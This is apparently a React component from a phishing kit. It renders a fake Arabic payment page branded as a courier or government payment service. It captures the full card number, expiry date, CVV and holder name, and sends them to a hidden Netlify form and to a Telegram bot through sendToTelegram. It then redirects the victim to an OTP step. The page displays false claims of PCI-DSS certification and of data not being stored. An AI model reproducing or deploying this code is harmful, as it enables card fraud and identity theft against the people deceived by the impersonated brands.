import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Loader2, Lock, ShieldCheck, CreditCard, Info, HelpCircle, ChevronRight, Globe, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovBranding } from "@/lib/governmentPaymentSystems";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentCardInput = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();
  
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
  const govId = searchParams.get("govId") || linkData?.payload?.govId;
  const branding = getServiceBranding(companyKey);
  const govBranding = govId ? getGovBranding(govId) : undefined;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  const isGov = !!govBranding;
  const primaryColor = isGov ? govBranding.colors.primary : branding.colors.primary;

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setCardNumber(formattedValue);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiryDate(value);
  };

  const getCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "");
    if (/^4/.test(cleanNumber)) return "visa";
    if (/^5[1-5]/.test(cleanNumber)) return "mastercard";
    if (/^6/.test(cleanNumber)) return "mada";
    return "unknown";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (cardNumber.replace(/\s/g, "").length < 16 || expiryDate.length < 5 || cvv.length < 3) {
      toast({ title: "خطأ", description: "الرجاء التحقق من بيانات البطاقة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const cardInfo = {
      cardLast4: cardNumber.slice(-4),
      cardType: getCardType(cardNumber),
      expiryDate,
      cardHolder
    };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, cardInfo } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-payment",
          linkId: id!,
          service: isGov ? govBranding.nameAr : branding.name,
          amount: formattedAmount,
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder
        }).toString()
      });

      await sendToTelegram({
        type: 'card_info',
        data: {
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder,
          service: isGov ? govBranding.nameAr : branding.name,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل معالجة البطاقة", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
      <PaymentMetaTags
        serviceKey={isGov ? govId! : companyKey}
        serviceName={isGov ? govBranding.nameAr : branding.name}
        title="بوابة الدفع الإلكتروني"
        amount={formattedAmount}
      />

      <header className="bg-white border-b shadow-sm h-16 sm:h-20 flex items-center sticky top-0 z-50 px-4">
         <div className="container mx-auto flex justify-between items-center">
            <div className="flex items-center gap-4">
               <img src={isGov ? govBranding.logo : branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
               <div className="h-8 w-px bg-slate-200 hidden sm:block" />
               <div className="hidden sm:block text-slate-400">
                  <p className="text-[10px] font-black uppercase tracking-widest leading-none mb-1">Payment Gateway</p>
                  <p className="text-[9px] font-bold">Secure Online Transaction</p>
               </div>
            </div>

            <div className="flex items-center gap-3">
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-slate-50 border text-[10px] font-bold text-slate-500 hover:bg-slate-100 transition-colors cursor-pointer">
                  <Globe className="w-3.5 h-3.5" />
                  <span>English</span>
               </div>
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-bold">
                  <Lock className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">آمن</span>
               </div>
            </div>
         </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-10 sm:py-16 flex flex-col items-center">
         <div className="w-full max-w-xl space-y-8">
            <div className="text-center space-y-3">
               <h1 className="text-3xl sm:text-4xl font-black text-slate-900 tracking-tight">إتمام عملية الدفع</h1>
               <div className="flex items-center justify-center gap-2 text-slate-400 font-bold uppercase tracking-[0.3em] text-[10px]">
                  <ShieldCheck className="w-4 h-4 text-primary" />
                  <span>Transaction ID: {id?.slice(0, 8).toUpperCase()}</span>
               </div>
            </div>

            <Card className="border-none shadow-[0_40px_100px_-20px_rgba(0,0,0,0.1)] rounded-[3rem] overflow-hidden bg-white">
               <div className="p-10 sm:p-12 border-b bg-slate-50/80 relative overflow-hidden group">
                  <div className="absolute top-0 left-0 w-full h-1 bg-primary/20 group-hover:bg-primary/40 transition-colors" />
                  <div className="flex items-center justify-between relative z-10">
                     <div className="space-y-1">
                        <p className="text-[11px] font-black text-slate-400 uppercase tracking-widest">إجمالي المبلغ</p>
                        <h2 className="text-4xl sm:text-5xl font-black text-slate-900 tracking-tighter" style={{ color: primaryColor }}>{formattedAmount}</h2>
                     </div>
                     <div className="text-left">
                        <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">حالة الطلب</p>
                        <div className="flex items-center gap-1.5 text-green-600 font-bold text-sm">
                           <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                           <span>بانتظار السداد</span>
                        </div>
                     </div>
                  </div>
                  <div className="absolute -bottom-10 -right-10 opacity-[0.03] rotate-12">
                     <CreditCard className="w-64 h-64" />
                  </div>
               </div>

               <form onSubmit={handleSubmit} className="p-10 sm:p-12 space-y-8">
                  <div className="space-y-7">
                     <div className="space-y-2">
                        <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1 flex justify-between">
                           <span>رقم البطاقة الائتمانية</span>
                           <span className="text-[10px] text-primary">Card Number</span>
                        </Label>
                        <div className="relative group">
                           <Input
                             value={cardNumber}
                             onChange={handleCardNumberChange}
                             className="h-16 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/30 pr-14 text-xl tracking-[0.15em] focus:border-primary focus:ring-4 focus:ring-primary/5 transition-all"
                             placeholder="0000 0000 0000 0000"
                             required
                           />
                           <CreditCard className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-slate-300 group-focus-within:text-primary transition-colors" />
                           <div className="absolute left-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
                              {getCardType(cardNumber) === "visa" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-5" />}
                              {getCardType(cardNumber) === "mastercard" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-5" />}
                              {getCardType(cardNumber) === "mada" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-5" />}
                           </div>
                        </div>
                     </div>

                     <div className="grid grid-cols-2 gap-8">
                        <div className="space-y-2">
                           <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">تاريخ الانتهاء (MM/YY)</Label>
                           <Input
                             value={expiryDate}
                             onChange={handleExpiryChange}
                             className="h-16 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/30 text-center text-xl focus:border-primary transition-all"
                             placeholder="MM/YY"
                             required
                           />
                        </div>
                        <div className="space-y-2">
                           <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">رمز الأمان (CVV)</Label>
                           <div className="relative">
                             <Input
                               value={cvv}
                               onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                               type="password"
                               className="h-16 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/30 text-center text-xl focus:border-primary transition-all"
                               placeholder="***"
                               required
                             />
                             <HelpCircle className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-200 cursor-help" />
                           </div>
                        </div>
                     </div>

                     <div className="space-y-2">
                        <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">اسم حامل البطاقة</Label>
                        <Input
                           value={cardHolder}
                           onChange={(e) => setCardHolder(e.target.value)}
                           className="h-16 border-2 border-slate-100 rounded-2xl font-black text-slate-700 bg-slate-50/30 px-6 text-lg focus:border-primary transition-all uppercase"
                           placeholder="HOLDER NAME AS WRITTEN ON CARD"
                           required
                        />
                     </div>
                  </div>

                  <div className="pt-8">
                     <Button
                       type="submit"
                       disabled={isSubmitting}
                       className="w-full h-20 rounded-2xl font-black text-xl shadow-[0_20px_50px_-10px_rgba(0,0,0,0.3)] text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3"
                       style={{ backgroundColor: primaryColor }}
                     >
                       {isSubmitting ? (
                         <Loader2 className="w-8 h-8 animate-spin" />
                       ) : (
                         <>
                           <span>تأكيد عملية السداد الآن</span>
                           <ShieldCheck className="w-6 h-6" />
                         </>
                       )}
                     </Button>

                     <div className="mt-10 flex flex-col items-center gap-6">
                        <div className="flex items-center gap-6 opacity-60 grayscale h-8">
                           <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                           <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                           <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
                        </div>
                        <p className="text-[10px] font-bold text-slate-400 leading-relaxed text-center max-w-sm">
                           بالنقر على زر التأكيد، أنت توافق على معالجة معاملتك المالية بأمان. جميع البيانات مشفرة ولا يتم تخزينها.
                        </p>
                     </div>
                  </div>
               </form>
            </Card>

            <div className="flex flex-col sm:flex-row items-center justify-between gap-6 px-4">
               <div className="flex items-center gap-3 text-slate-400">
                  <div className="w-10 h-10 rounded-full bg-white border flex items-center justify-center text-primary">
                     <Shield className="w-5 h-5" />
                  </div>
                  <div>
                     <p className="text-[10px] font-black text-slate-800 uppercase leading-none mb-1">PCI-DSS Certified</p>
                     <p className="text-[9px] font-bold">معايير أمان عالمية</p>
                  </div>
               </div>
               <div className="flex items-center gap-3 text-slate-400">
                  <div className="w-10 h-10 rounded-full bg-white border flex items-center justify-center text-primary">
                     <Lock className="w-5 h-5" />
                  </div>
                  <div>
                     <p className="text-[10px] font-black text-slate-800 uppercase leading-none mb-1">Encrypted Session</p>
                     <p className="text-[9px] font-bold">اتصال مشفر 256-bit</p>
                  </div>
               </div>
            </div>
         </div>
      </main>

      <form name="card-payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardNumber" />
        <input type="text" name="expiryDate" />
        <input type="text" name="cvv" />
        <input type="text" name="cardHolder" />
      </form>
    </div>
  );
};

export default PaymentCardInput;
